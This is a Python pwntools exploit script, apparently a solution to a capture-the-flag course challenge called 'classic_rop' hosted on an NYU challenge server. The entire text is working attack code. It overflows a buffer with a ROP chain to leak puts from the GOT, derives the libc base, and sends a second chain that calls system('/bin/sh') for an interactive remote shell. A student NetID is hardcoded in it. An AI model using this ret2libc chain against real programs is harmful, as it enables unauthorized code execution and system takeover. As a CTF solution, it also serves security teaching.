from pwn import *

context.arch = "amd64"
binary = ELF("./classic_rop", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1202)
conn.recvuntil(b'NetID')
conn.sendline(b'vc2499')  

rop = ROP(binary)
pop_rdi = rop.rdi.address
ret = rop.ret.address
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_function = binary.symbols['main']

conn.recvuntil(b"Let's ROP!\n")
conn.sendline(b'3000')  

leak_payload = (
    b'A' * 40 +             
    p64(pop_rdi) +          
    p64(puts_got) +
    p64(puts_plt) +         
    p64(main_function)      
)
conn.sendline(leak_payload)

leaked_puts = u64(conn.recvn(6).ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
assert libc_base & 0xfff == 0, "Error: Misaligned libc base address!"

bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols['system']

conn.recvuntil(b"Let's ROP!\n")
conn.sendline(b'3000')

exec_payload = (
    b'A' * 40 +             
    p64(pop_rdi) +          
    p64(bin_sh) +
    p64(ret) +              
    p64(system)             
)
conn.sendline(exec_payload)
conn.interactive()

